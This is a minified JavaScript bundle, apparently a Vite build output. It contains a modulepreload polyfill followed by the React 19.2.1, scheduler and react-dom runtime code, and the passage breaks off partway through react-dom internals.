(function() {
    const d = document.createElement("link").relList;
    if (d && d.supports && d.supports("modulepreload"))
        return;
    for (const p of document.querySelectorAll('link[rel="modulepreload"]'))
        o(p);
    new MutationObserver(p => {
        for (const v of p)
            if (v.type === "childList")
                for (const x of v.addedNodes)
                    x.tagName === "LINK" && x.rel === "modulepreload" && o(x)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function f(p) {
        const v = {};
        return p.integrity && (v.integrity = p.integrity),
        p.referrerPolicy && (v.referrerPolicy = p.referrerPolicy),
        p.crossOrigin === "use-credentials" ? v.credentials = "include" : p.crossOrigin === "anonymous" ? v.credentials = "omit" : v.credentials = "same-origin",
        v
    }
    function o(p) {
        if (p.ep)
            return;
        p.ep = !0;
        const v = f(p);
        fetch(p.href, v)
    }
}
)();
var Ls = {
    exports: {}
}
  , kn = {};
var Id;
function Fp() {
    if (Id)
        return kn;
    Id = 1;
    var s = Symbol.for("react.transitional.element")
      , d = Symbol.for("react.fragment");
    function f(o, p, v) {
        var x = null;
        if (v !== void 0 && (x = "" + v),
        p.key !== void 0 && (x = "" + p.key),
        "key" in p) {
            v = {};
            for (var z in p)
                z !== "key" && (v[z] = p[z])
        } else
            v = p;
        return p = v.ref,
        {
            $$typeof: s,
            type: o,
            key: x,
            ref: p !== void 0 ? p : null,
            props: v
        }
    }
    return kn.Fragment = d,
    kn.jsx = f,
    kn.jsxs = f,
    kn
}
var Pd;
function Ip() {
    return Pd || (Pd = 1,
    Ls.exports = Fp()),
    Ls.exports
}
var i = Ip()
  , Bs = {
    exports: {}
}
  , ue = {};
var em;
function Pp() {
    if (em)
        return ue;
    em = 1;
    var s = Symbol.for("react.transitional.element")
      , d = Symbol.for("react.portal")
      , f = Symbol.for("react.fragment")
      , o = Symbol.for("react.strict_mode")
      , p = Symbol.for("react.profiler")
      , v = Symbol.for("react.consumer")
      , x = Symbol.for("react.context")
      , z = Symbol.for("react.forward_ref")
      , N = Symbol.for("react.suspense")
      , m = Symbol.for("react.memo")
      , D = Symbol.for("react.lazy")
      , j = Symbol.for("react.activity")
      , H = Symbol.iterator;
    function q(g) {
        return g === null || typeof g != "object" ? null : (g = H && g[H] || g["@@iterator"],
        typeof g == "function" ? g : null)
    }
    var X = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    }
      , Y = Object.assign
      , G = {};
    function w(g, _, L) {
        this.props = g,
        this.context = _,
        this.refs = G,
        this.updater = L || X
    }
    w.prototype.isReactComponent = {},
    w.prototype.setState = function(g, _) {
        if (typeof g != "object" && typeof g != "function" && g != null)
            throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
        this.updater.enqueueSetState(this, g, _, "setState")
    }
    ,
    w.prototype.forceUpdate = function(g) {
        this.updater.enqueueForceUpdate(this, g, "forceUpdate")
    }
    ;
    function Q() {}
    Q.prototype = w.prototype;
    function V(g, _, L) {
        this.props = g,
        this.context = _,
        this.refs = G,
        this.updater = L || X
    }
    var ae = V.prototype = new Q;
    ae.constructor = V,
    Y(ae, w.prototype),
    ae.isPureReactComponent = !0;
    var be = Array.isArray;
    function se() {}
    var F = {
        H: null,
        A: null,
        T: null,
        S: null
    }
      , re = Object.prototype.hasOwnProperty;
    function xe(g, _, L) {
        var Z = L.ref;
        return {
            $$typeof: s,
            type: g,
            key: _,
            ref: Z !== void 0 ? Z : null,
            props: L
        }
    }
    function Ae(g, _) {
        return xe(g.type, _, g.props)
    }
    function te(g) {
        return typeof g == "object" && g !== null && g.$$typeof === s
    }
    function le(g) {
        var _ = {
            "=": "=0",
            ":": "=2"
        };
        return "$" + g.replace(/[=:]/g, function(L) {
            return _[L]
        })
    }
    var it = /\/+/g;
    function Fe(g, _) {
        return typeof g == "object" && g !== null && g.key != null ? le("" + g.key) : _.toString(36)
    }
    function Qe(g) {
        switch (g.status) {
        case "fulfilled":
            return g.value;
        case "rejected":
            throw g.reason;
        default:
            switch (typeof g.status == "string" ? g.then(se, se) : (g.status = "pending",
            g.then(function(_) {
                g.status === "pending" && (g.status = "fulfilled",
                g.value = _)
            }, function(_) {
                g.status === "pending" && (g.status = "rejected",
                g.reason = _)
            })),
            g.status) {
            case "fulfilled":
                return g.value;
            case "rejected":
                throw g.reason
            }
        }
        throw g
    }
    function O(g, _, L, Z, I) {
        var ne = typeof g;
        (ne === "undefined" || ne === "boolean") && (g = null);
        var ie = !1;
        if (g === null)
            ie = !0;
        else
            switch (ne) {
            case "bigint":
            case "string":
            case "number":
                ie = !0;
                break;
            case "object":
                switch (g.$$typeof) {
                case s:
                case d:
                    ie = !0;
                    break;
                case D:
                    return ie = g._init,
                    O(ie(g._payload), _, L, Z, I)
                }
            }
        if (ie)
            return I = I(g),
            ie = Z === "" ? "." + Fe(g, 0) : Z,
            be(I) ? (L = "",
            ie != null && (L = ie.replace(it, "$&/") + "/"),
            O(I, _, L, "", function(ee) {
                return ee
            })) : I != null && (te(I) && (I = Ae(I, L + (I.key == null || g && g.key === I.key ? "" : ("" + I.key).replace(it, "$&/") + "/") + ie)),
            _.push(I)),
            1;
        ie = 0;
        var Ie = Z === "" ? "." : Z + ":";
        if (be(g))
            for (var Re = 0; Re < g.length; Re++)
                Z = g[Re],
                ne = Ie + Fe(Z, Re),
                ie += O(Z, _, L, ne, I);
        else if (Re = q(g),
        typeof Re == "function")
            for (g = Re.call(g),
            Re = 0; !(Z = g.next()).done; )
                Z = Z.value,
                ne = Ie + Fe(Z, Re++),
                ie += O(Z, _, L, ne, I);
        else if (ne === "object") {
            if (typeof g.then == "function")
                return O(Qe(g), _, L, Z, I);
            throw _ = String(g),
            Error("Objects are not valid as a React child (found: " + (_ === "[object Object]" ? "object with keys {" + Object.keys(g).join(", ") + "}" : _) + "). If you meant to render a collection of children, use an array instead.")
        }
        return ie
    }
    function B(g, _, L) {
        if (g == null)
            return g;
        var Z = []
          , I = 0;
        return O(g, Z, "", "", function(ne) {
            return _.call(L, ne, I++)
        }),
        Z
    }
    function $(g) {
        if (g._status === -1) {
            var _ = g._result;
            _ = _(),
            _.then(function(L) {
                (g._status === 0 || g._status === -1) && (g._status = 1,
                g._result = L)
            }, function(L) {
                (g._status === 0 || g._status === -1) && (g._status = 2,
                g._result = L)
            }),
            g._status === -1 && (g._status = 0,
            g._result = _)
        }
        if (g._status === 1)
            return g._result.default;
        throw g._result
    }
    var he = typeof reportError == "function" ? reportError : function(g) {
        if (typeof window == "object" && typeof window.ErrorEvent == "function") {
            var _ = new window.ErrorEvent("error",{
                bubbles: !0,
                cancelable: !0,
                message: typeof g == "object" && g !== null && typeof g.message == "string" ? String(g.message) : String(g),
                error: g
            });
            if (!window.dispatchEvent(_))
                return
        } else if (typeof process == "object" && typeof process.emit == "function") {
            process.emit("uncaughtException", g);
            return
        }
        console.error(g)
    }
      , pe = {
        map: B,
        forEach: function(g, _, L) {
            B(g, function() {
                _.apply(this, arguments)
            }, L)
        },
        count: function(g) {
            var _ = 0;
            return B(g, function() {
                _++
            }),
            _
        },
        toArray: function(g) {
            return B(g, function(_) {
                return _
            }) || []
        },
        only: function(g) {
            if (!te(g))
                throw Error("React.Children.only expected to receive a single React element child.");
            return g
        }
    };
    return ue.Activity = j,
    ue.Children = pe,
    ue.Component = w,
    ue.Fragment = f,
    ue.Profiler = p,
    ue.PureComponent = V,
    ue.StrictMode = o,
    ue.Suspense = N,
    ue.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = F,
    ue.__COMPILER_RUNTIME = {
        __proto__: null,
        c: function(g) {
            return F.H.useMemoCache(g)
        }
    },
    ue.cache = function(g) {
        return function() {
            return g.apply(null, arguments)
        }
    }
    ,
    ue.cacheSignal = function() {
        return null
    }
    ,
    ue.cloneElement = function(g, _, L) {
        if (g == null)
            throw Error("The argument must be a React element, but you passed " + g + ".");
        var Z = Y({}, g.props)
          , I = g.key;
        if (_ != null)
            for (ne in _.key !== void 0 && (I = "" + _.key),
            _)
                !re.call(_, ne) || ne === "key" || ne === "__self" || ne === "__source" || ne === "ref" && _.ref === void 0 || (Z[ne] = _[ne]);
        var ne = arguments.length - 2;
        if (ne === 1)
            Z.children = L;
        else if (1 < ne) {
            for (var ie = Array(ne), Ie = 0; Ie < ne; Ie++)
                ie[Ie] = arguments[Ie + 2];
            Z.children = ie
        }
        return xe(g.type, I, Z)
    }
    ,
    ue.createContext = function(g) {
        return g = {
            $$typeof: x,
            _currentValue: g,
            _currentValue2: g,
            _threadCount: 0,
            Provider: null,
            Consumer: null
        },
        g.Provider = g,
        g.Consumer = {
            $$typeof: v,
            _context: g
        },
        g
    }
    ,
    ue.createElement = function(g, _, L) {
        var Z, I = {}, ne = null;
        if (_ != null)
            for (Z in _.key !== void 0 && (ne = "" + _.key),
            _)
                re.call(_, Z) && Z !== "key" && Z !== "__self" && Z !== "__source" && (I[Z] = _[Z]);
        var ie = arguments.length - 2;
        if (ie === 1)
            I.children = L;
        else if (1 < ie) {
            for (var Ie = Array(ie), Re = 0; Re < ie; Re++)
                Ie[Re] = arguments[Re + 2];
            I.children = Ie
        }
        if (g && g.defaultProps)
            for (Z in ie = g.defaultProps,
            ie)
                I[Z] === void 0 && (I[Z] = ie[Z]);
        return xe(g, ne, I)
    }
    ,
    ue.createRef = function() {
        return {
            current: null
        }
    }
    ,
    ue.forwardRef = function(g) {
        return {
            $$typeof: z,
            render: g
        }
    }
    ,
    ue.isValidElement = te,
    ue.lazy = function(g) {
        return {
            $$typeof: D,
            _payload: {
                _status: -1,
                _result: g
            },
            _init: $
        }
    }
    ,
    ue.memo = function(g, _) {
        return {
            $$typeof: m,
            type: g,
            compare: _ === void 0 ? null : _
        }
    }
    ,
    ue.startTransition = function(g) {
        var _ = F.T
          , L = {};
        F.T = L;
        try {
            var Z = g()
              , I = F.S;
            I !== null && I(L, Z),
            typeof Z == "object" && Z !== null && typeof Z.then == "function" && Z.then(se, he)
        } catch (ne) {
            he(ne)
        } finally {
            _ !== null && L.types !== null && (_.types = L.types),
            F.T = _
        }
    }
    ,
    ue.unstable_useCacheRefresh = function() {
        return F.H.useCacheRefresh()
    }
    ,
    ue.use = function(g) {
        return F.H.use(g)
    }
    ,
    ue.useActionState = function(g, _, L) {
        return F.H.useActionState(g, _, L)
    }
    ,
    ue.useCallback = function(g, _) {
        return F.H.useCallback(g, _)
    }
    ,
    ue.useContext = function(g) {
        return F.H.useContext(g)
    }
    ,
    ue.useDebugValue = function() {}
    ,
    ue.useDeferredValue = function(g, _) {
        return F.H.useDeferredValue(g, _)
    }
    ,
    ue.useEffect = function(g, _) {
        return F.H.useEffect(g, _)
    }
    ,
    ue.useEffectEvent = function(g) {
        return F.H.useEffectEvent(g)
    }
    ,
    ue.useId = function() {
        return F.H.useId()
    }
    ,
    ue.useImperativeHandle = function(g, _, L) {
        return F.H.useImperativeHandle(g, _, L)
    }
    ,
    ue.useInsertionEffect = function(g, _) {
        return F.H.useInsertionEffect(g, _)
    }
    ,
    ue.useLayoutEffect = function(g, _) {
        return F.H.useLayoutEffect(g, _)
    }
    ,
    ue.useMemo = function(g, _) {
        return F.H.useMemo(g, _)
    }
    ,
    ue.useOptimistic = function(g, _) {
        return F.H.useOptimistic(g, _)
    }
    ,
    ue.useReducer = function(g, _, L) {
        return F.H.useReducer(g, _, L)
    }
    ,
    ue.useRef = function(g) {
        return F.H.useRef(g)
    }
    ,
    ue.useState = function(g) {
        return F.H.useState(g)
    }
    ,
    ue.useSyncExternalStore = function(g, _, L) {
        return F.H.useSyncExternalStore(g, _, L)
    }
    ,
    ue.useTransition = function() {
        return F.H.useTransition()
    }
    ,
    ue.version = "19.2.1",
    ue
}
var tm;
function Js() {
    return tm || (tm = 1,
    Bs.exports = Pp()),
    Bs.exports
}
var S = Js()
  , qs = {
    exports: {}
}
  , $n = {}
  , Ys = {
    exports: {}
}
  , ws = {};
var lm;
function ev() {
    return lm || (lm = 1,
    (function(s) {
        function d(O, B) {
            var $ = O.length;
            O.push(B);
            e: for (; 0 < $; ) {
                var he = $ - 1 >>> 1
                  , pe = O[he];
                if (0 < p(pe, B))
                    O[he] = B,
                    O[$] = pe,
                    $ = he;
                else
                    break e
            }
        }
        function f(O) {
            return O.length === 0 ? null : O[0]
        }
        function o(O) {
            if (O.length === 0)
                return null;
            var B = O[0]
              , $ = O.pop();
            if ($ !== B) {
                O[0] = $;
                e: for (var he = 0, pe = O.length, g = pe >>> 1; he < g; ) {
                    var _ = 2 * (he + 1) - 1
                      , L = O[_]
                      , Z = _ + 1
                      , I = O[Z];
                    if (0 > p(L, $))
                        Z < pe && 0 > p(I, L) ? (O[he] = I,
                        O[Z] = $,
                        he = Z) : (O[he] = L,
                        O[_] = $,
                        he = _);
                    else if (Z < pe && 0 > p(I, $))
                        O[he] = I,
                        O[Z] = $,
                        he = Z;
                    else
                        break e
                }
            }
            return B
        }
        function p(O, B) {
            var $ = O.sortIndex - B.sortIndex;
            return $ !== 0 ? $ : O.id - B.id
        }
        if (s.unstable_now = void 0,
        typeof performance == "object" && typeof performance.now == "function") {
            var v = performance;
            s.unstable_now = function() {
                return v.now()
            }
        } else {
            var x = Date
              , z = x.now();
            s.unstable_now = function() {
                return x.now() - z
            }
        }
        var N = []
          , m = []
          , D = 1
          , j = null
          , H = 3
          , q = !1
          , X = !1
          , Y = !1
          , G = !1
          , w = typeof setTimeout == "function" ? setTimeout : null
          , Q = typeof clearTimeout == "function" ? clearTimeout : null
          , V = typeof setImmediate < "u" ? setImmediate : null;
        function ae(O) {
            for (var B = f(m); B !== null; ) {
                if (B.callback === null)
                    o(m);
                else if (B.startTime <= O)
                    o(m),
                    B.sortIndex = B.expirationTime,
                    d(N, B);
                else
                    break;
                B = f(m)
            }
        }
        function be(O) {
            if (Y = !1,
            ae(O),
            !X)
                if (f(N) !== null)
                    X = !0,
                    se || (se = !0,
                    le());
                else {
                    var B = f(m);
                    B !== null && Qe(be, B.startTime - O)
                }
        }
        var se = !1
          , F = -1
          , re = 5
          , xe = -1;
        function Ae() {
            return G ? !0 : !(s.unstable_now() - xe < re)
        }
        function te() {
            if (G = !1,
            se) {
                var O = s.unstable_now();
                xe = O;
                var B = !0;
                try {
                    e: {
                        X = !1,
                        Y && (Y = !1,
                        Q(F),
                        F = -1),
                        q = !0;
                        var $ = H;
                        try {
                            t: {
                                for (ae(O),
                                j = f(N); j !== null && !(j.expirationTime > O && Ae()); ) {
                                    var he = j.callback;
                                    if (typeof he == "function") {
                                        j.callback = null,
                                        H = j.priorityLevel;
                                        var pe = he(j.expirationTime <= O);
                                        if (O = s.unstable_now(),
                                        typeof pe == "function") {
                                            j.callback = pe,
                                            ae(O),
                                            B = !0;
                                            break t
                                        }
                                        j === f(N) && o(N),
                                        ae(O)
                                    } else
                                        o(N);
                                    j = f(N)
                                }
                                if (j !== null)
                                    B = !0;
                                else {
                                    var g = f(m);
                                    g !== null && Qe(be, g.startTime - O),
                                    B = !1
                                }
                            }
                            break e
                        } finally {
                            j = null,
                            H = $,
                            q = !1
                        }
                        B = void 0
                    }
                } finally {
                    B ? le() : se = !1
                }
            }
        }
        var le;
        if (typeof V == "function")
            le = function() {
                V(te)
            }
            ;
        else if (typeof MessageChannel < "u") {
            var it = new MessageChannel
              , Fe = it.port2;
            it.port1.onmessage = te,
            le = function() {
                Fe.postMessage(null)
            }
        } else
            le = function() {
                w(te, 0)
            }
            ;
        function Qe(O, B) {
            F = w(function() {
                O(s.unstable_now())
            }, B)
        }
        s.unstable_IdlePriority = 5,
        s.unstable_ImmediatePriority = 1,
        s.unstable_LowPriority = 4,
        s.unstable_NormalPriority = 3,
        s.unstable_Profiling = null,
        s.unstable_UserBlockingPriority = 2,
        s.unstable_cancelCallback = function(O) {
            O.callback = null
        }
        ,
        s.unstable_forceFrameRate = function(O) {
            0 > O || 125 < O ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : re = 0 < O ? Math.floor(1e3 / O) : 5
        }
        ,
        s.unstable_getCurrentPriorityLevel = function() {
            return H
        }
        ,
        s.unstable_next = function(O) {
            switch (H) {
            case 1:
            case 2:
            case 3:
                var B = 3;
                break;
            default:
                B = H
            }
            var $ = H;
            H = B;
            try {
                return O()
            } finally {
                H = $
            }
        }
        ,
        s.unstable_requestPaint = function() {
            G = !0
        }
        ,
        s.unstable_runWithPriority = function(O, B) {
            switch (O) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                O = 3
            }
            var $ = H;
            H = O;
            try {
                return B()
            } finally {
                H = $
            }
        }
        ,
        s.unstable_scheduleCallback = function(O, B, $) {
            var he = s.unstable_now();
            switch (typeof $ == "object" && $ !== null ? ($ = $.delay,
            $ = typeof $ == "number" && 0 < $ ? he + $ : he) : $ = he,
            O) {
            case 1:
                var pe = -1;
                break;
            case 2:
                pe = 250;
                break;
            case 5:
                pe = 1073741823;
                break;
            case 4:
                pe = 1e4;
                break;
            default:
                pe = 5e3
            }
            return pe = $ + pe,
            O = {
                id: D++,
                callback: B,
                priorityLevel: O,
                startTime: $,
                expirationTime: pe,
                sortIndex: -1
            },
            $ > he ? (O.sortIndex = $,
            d(m, O),
            f(N) === null && O === f(m) && (Y ? (Q(F),
            F = -1) : Y = !0,
            Qe(be, $ - he))) : (O.sortIndex = pe,
            d(N, O),
            X || q || (X = !0,
            se || (se = !0,
            le()))),
            O
        }
        ,
        s.unstable_shouldYield = Ae,
        s.unstable_wrapCallback = function(O) {
            var B = H;
            return function() {
                var $ = H;
                H = B;
                try {
                    return O.apply(this, arguments)
                } finally {
                    H = $
                }
            }
        }
    }
    )(ws)),
    ws
}
var am;
function tv() {
    return am || (am = 1,
    Ys.exports = ev()),
    Ys.exports
}
var Gs = {
    exports: {}
}
  , st = {};
var nm;
function lv() {
    if (nm)
        return st;
    nm = 1;
    var s = Js();
    function d(N) {
        var m = "https://react.dev/errors/" + N;
        if (1 < arguments.length) {
            m += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var D = 2; D < arguments.length; D++)
                m += "&args[]=" + encodeURIComponent(arguments[D])
        }
        return "Minified React error #" + N + "; visit " + m + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function f() {}
    var o = {
        d: {
            f,
            r: function() {
                throw Error(d(522))
            },
            D: f,
            C: f,
            L: f,
            m: f,
            X: f,
            S: f,
            M: f
        },
        p: 0,
        findDOMNode: null
    }
      , p = Symbol.for("react.portal");
    function v(N, m, D) {
        var j = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
        return {
            $$typeof: p,
            key: j == null ? null : "" + j,
            children: N,
            containerInfo: m,
            implementation: D
        }
    }
    var x = s.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
    function z(N, m) {
        if (N === "font")
            return "";
        if (typeof m == "string")
            return m === "use-credentials" ? m : ""
    }
    return st.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = o,
    st.createPortal = function(N, m) {
        var D = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
        if (!m || m.nodeType !== 1 && m.nodeType !== 9 && m.nodeType !== 11)
            throw Error(d(299));
        return v(N, m, null, D)
    }
    ,
    st.flushSync = function(N) {
        var m = x.T
          , D = o.p;
        try {
            if (x.T = null,
            o.p = 2,
            N)
                return N()
        } finally {
            x.T = m,
            o.p = D,
            o.d.f()
        }
    }
    ,
    st.preconnect = function(N, m) {
        typeof N == "string" && (m ? (m = m.crossOrigin,
        m = typeof m == "string" ? m === "use-credentials" ? m : "" : void 0) : m = null,
        o.d.C(N, m))
    }
    ,
    st.prefetchDNS = function(N) {
        typeof N == "string" && o.d.D(N)
    }
    ,
    st.preinit = function(N, m) {
        if (typeof N == "string" && m && typeof m.as == "string") {
            var D = m.as
              , j = z(D, m.crossOrigin)
              , H = typeof m.integrity == "string" ? m.integrity : void 0
              , q = typeof m.fetchPriority == "string" ? m.fetchPriority : void 0;
            D === "style" ? o.d.S(N, typeof m.precedence == "string" ? m.precedence : void 0, {
                crossOrigin: j,
                integrity: H,
                fetchPriority: q
            }) : D === "script" && o.d.X(N, {
                crossOrigin: j,
                integrity: H,
                fetchPriority: q,
                nonce: typeof m.nonce == "string" ? m.nonce : void 0
            })
        }
    }
    ,
    st.preinitModule = function(N, m) {
        if (typeof N == "string")
            if (typeof m == "object" && m !== null) {
                if (m.as == null || m.as === "script") {
                    var D = z(m.as, m.crossOrigin);
                    o.d.M(N, {
                        crossOrigin: D,
                        integrity: typeof m.integrity == "string" ? m.integrity : void 0,
                        nonce: typeof m.nonce == "string" ? m.nonce : void 0
                    })
                }
            } else
                m == null && o.d.M(N)
    }
    ,
    st.preload = function(N, m) {
        if (typeof N == "string" && typeof m == "object" && m !== null && typeof m.as == "string") {
            var D = m.as
              , j = z(D, m.crossOrigin);
            o.d.L(N, D, {
                crossOrigin: j,
                integrity: typeof m.integrity == "string" ? m.integrity : void 0,
                nonce: typeof m.nonce == "string" ? m.nonce : void 0,
                type: typeof m.type == "string" ? m.type : void 0,
                fetchPriority: typeof m.fetchPriority == "string" ? m.fetchPriority : void 0,
                referrerPolicy: typeof m.referrerPolicy == "string" ? m.referrerPolicy : void 0,
                imageSrcSet: typeof m.imageSrcSet == "string" ? m.imageSrcSet : void 0,
                imageSizes: typeof m.imageSizes == "string" ? m.imageSizes : void 0,
                media: typeof m.media == "string" ? m.media : void 0
            })
        }
    }
    ,
    st.preloadModule = function(N, m) {
        if (typeof N == "string")
            if (m) {
                var D = z(m.as, m.crossOrigin);
                o.d.m(N, {
                    as: typeof m.as == "string" && m.as !== "script" ? m.as : void 0,
                    crossOrigin: D,
                    integrity: typeof m.integrity == "string" ? m.integrity : void 0
                })
            } else
                o.d.m(N)
    }
    ,
    st.requestFormReset = function(N) {
        o.d.r(N)
    }
    ,
    st.unstable_batchedUpdates = function(N, m) {
        return N(m)
    }
    ,
    st.useFormState = function(N, m, D) {
        return x.H.useFormState(N, m, D)
    }
    ,
    st.useFormStatus = function() {
        return x.H.useHostTransitionStatus()
    }
    ,
    st.version = "19.2.1",
    st
}
var um;
function av() {
    if (um)
        return Gs.exports;
    um = 1;
    function s() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(s)
            } catch (d) {
                console.error(d)
            }
    }
    return s(),
    Gs.exports = lv(),
    Gs.exports
}
var im;
function nv() {
    if (im)
        return $n;
    im = 1;
    var s = tv()
      , d = Js()
      , f = av();
    function o(e) {
        var t = "https://react.dev/errors/" + e;
        if (1 < arguments.length) {
            t += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var l = 2; l < arguments.length; l++)
                t += "&args[]=" + encodeURIComponent(arguments[l])
        }
        return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function p(e) {
        return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
    }
    function v(e) {
        var t = e
          , l = e;
        if (e.alternate)
            for (; t.return; )
                t = t.return;
        else {
            e = t;
            do
                t = e,
                (t.flags & 4098) !== 0 && (l = t.return),
                e = t.return;
            while (e)
        }
        return t.tag === 3 ? l : null
    }
    function x(e) {
        if (e.tag === 13) {
            var t = e.memoizedState;
            if (t === null && (e = e.alternate,
            e !== null && (t = e.memoizedState)),
            t !== null)
                return t.dehydrated
        }
        return null
    }
    function z(e) {
        if (e.tag === 31) {
            var t = e.memoizedState;
            if (t === null && (e = e.alternate,
            e !== null && (t = e.memoizedState)),
            t !== null)
                return t.dehydrated
        }
        return null
    }
    function N(e) {
        if (v(e) !== e)
            throw Error(o(188))
    }
    function m(e) {
        var t = e.alternate;
        if (!t) {
            if (t = v(e),
            t === null)
                throw Error(o(188));
            return t !== e ? null : e
        }
        for (var l = e, a = t; ; ) {
            var n = l.return;
            if (n === null)
                break;
            var u = n.alternate;
            if (u === null) {
                if (a = n.return,
                a !== null) {
                    l = a;
                    continue
                }
                break
            }
            if (n.child === u.child) {
                for (u = n.child; u; ) {
                    if (u === l)
                        return N(n),
                        e;
                    if (u === a)
                        return N(n),
                        t;
                    u = u.sibling
                }
                throw Error(o(188))
            }
            if (l.return !== a.return)
                l = n,
                a = u;
            else {
                for (var c = !1, r = n.child; r; ) {
                    if (r === l) {
                        c = !0,
                        l = n,
                        a = u;
                        break
                    }
                    if (r === a) {
                        c = !0,
                        a = n,
                        l = u;
                        break
                    }
                    r = r.sibling
                }
                if (!c) {
                    for (r = u.child; r; ) {
                        if (r === l) {
                            c = !0,
                            l = u,
                            a = n;
                            break
                        }
                        if (r === a) {
                            c = !0,
                            a = u,
                            l = n;
                            break
                        }
                        r = r.sibling
                    }
                    if (!c)
                        throw Error(o(189))
                }
            }
            if (l.alternate !== a)
                throw Error(o(190))
        }
        if (l.tag !== 3)
            throw Error(o(188));
        return l.stateNode.current === l ? e : t
    }
    function D(e) {
        var t = e.tag;
        if (t === 5 || t === 26 || t === 27 || t === 6)
            return e;
        for (e = e.child; e !== null; ) {
            if (t = D(e),
            t !== null)
                return t;
            e = e.sibling
        }
        return null
    }
    var j = Object.assign
      , H = Symbol.for("react.element")
      , q = Symbol.for("react.transitional.element")
      , X = Symbol.for("react.portal")
      , Y = Symbol.for("react.fragment")
      , G = Symbol.for("react.strict_mode")
      , w = Symbol.for("react.profiler")
      , Q = Symbol.for("react.consumer")
      , V = Symbol.for("react.context")
      , ae = Symbol.for("react.forward_ref")
      , be = Symbol.for("react.suspense")
      , se = Symbol.for("react.suspense_list")
      , F = Symbol.for("react.memo")
      , re = Symbol.for("react.lazy")
      , xe = Symbol.for("react.activity")
      , Ae = Symbol.for("react.memo_cache_sentinel")
      , te = Symbol.iterator;
    function le(e) {
        return e === null || typeof e != "object" ? null : (e = te && e[te] || e["@@iterator"],
        typeof e == "function" ? e : null)
    }
    var it = Symbol.for("react.client.reference");
    function Fe(e) {
        if (e == null)
            return null;
        if (typeof e == "function")
            return e.$$typeof === it ? null : e.displayName || e.name || null;
        if (typeof e == "string")
            return e;
        switch (e) {
        case Y:
            return "Fragment";
        case w:
            return "Profiler";
        case G:
            return "StrictMode";
        case be:
            return "Suspense";
        case se:
            return "SuspenseList";
        case xe:
            return "Activity"
        }
        if (typeof e == "object")
            switch (e.$$typeof) {
            case X:
                return "Portal";
            case V:
                return e.displayName || "Context";
            case Q:
                return (e._context.displayName || "Context") + ".Consumer";
            case ae:
                var t = e.render;
                return e = e.displayName,
                e || (e = t.displayName || t.name || "",
                e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"),
                e;
            case F:
                return t = e.displayName || null,
                t !== null ? t : Fe(e.type) || "Memo";
            case re:
                t = e._payload,
                e = e._init;
                try {
                    return Fe(e(t))
                } catch {}
            }
        return null
    }
    var Qe = Array.isArray
      , O = d.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , B = f.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , $ = {
        pending: !1,
        data: null,
        method: null,
        action: null
    }
      , he = []
      , pe = -1;
    function g(e) {
        return {
            current: e
        }
    }
    function _(e) {
        0 > pe || (e.current = he[pe],
        he[pe] = null,
        pe--)
    }
    function L(e, t) {
        pe++,
        he[pe] = e.current,
        e.current = t
    }
    var Z = g(null)
      , I = g(null)
      , ne = g(null)
      , ie = g(null);
    function Ie(e, t) {
        switch (L(ne, t),
        L(I, e),
        L(Z, null),
        t.nodeType) {
        case 9:
        case 11:
            e = (e = t.documentElement) && (e = e.namespaceURI) ? xd(e) : 0;
            break;
        default:
            if (e = t.tagName,
            t = t.namespaceURI)
                t = xd(t),
                e = Nd(t, e);
            else
                switch (e) {
                case "svg":
                    e = 1;
                    break;
                case "math":
                    e = 2;
                    break;
                default:
                    e = 0
                }
        }
        _(Z),
        L(Z, e)
    }
    function Re() {
        _(Z),
        _(I),
        _(ne)
    }
    function ee(e) {
        e.memoizedState !== null && L(ie, e);
        var t = Z.current
          , l = Nd(t, e.type);
        t !== l && (L(I, e),
        L(Z, l))
    }
    function ge(e) {
        I.current === e && (_(Z),
        _(I)),
        ie.current === e && (_(ie),
        Zn._currentValue = $)
    }
    var _e, ct;
    function qe(e) {
        if (_e === void 0)
            try {
                throw Error()
            } catch (l) {
                var t = l.stack.trim().match(/\n( *(at )?)/);
                _e = t && t[1] || "",
                ct = -1 < l.stack.indexOf(`
    at`) ? " (<anonymous>)" : -1 < l.stack.indexOf("@") ? "@unknown:0:0" : ""
            }
        return `
` + _e + e + ct
    }
    var ot = !1;
    function Ql(e, t) {
        if (!e || ot)
            return "";
        ot = !0;
        var l = Error.prepareStackTrace;
        Error.prepareStackTrace = void 0;
        try {
            var a = {
                DetermineComponentFrameRoot: function() {
                    try {
                        if (t) {
                            var U = function() {
                                throw Error()
                            };
                            if (Object.defineProperty(U.prototype, "props", {
                                set: function() {
                                    throw Error()
                                }
                            }),
                            typeof Reflect == "object" && Reflect.construct) {
                                try {
                                    Reflect.construct(U, [])
                                } catch (C) {
                                    var A = C
                                }
                                Reflect.construct(e, [], U)
                            } else {
                                try {
                                    U.call()
                                } catch (C) {
                                    A = C
                                }
                                e.call(U.prototype)
                            }
                        } else {
                            try {
                                throw Error()
                            } catch (C) {
                                A = C
                            }
                            (U = e()) && typeof U.catch == "function" && U.catch(function() {})
                        }
                    } catch (C) {
                        if (C && A && typeof C.stack == "string")
                            return [C.stack, A.stack]
                    }
                    return [null, null]
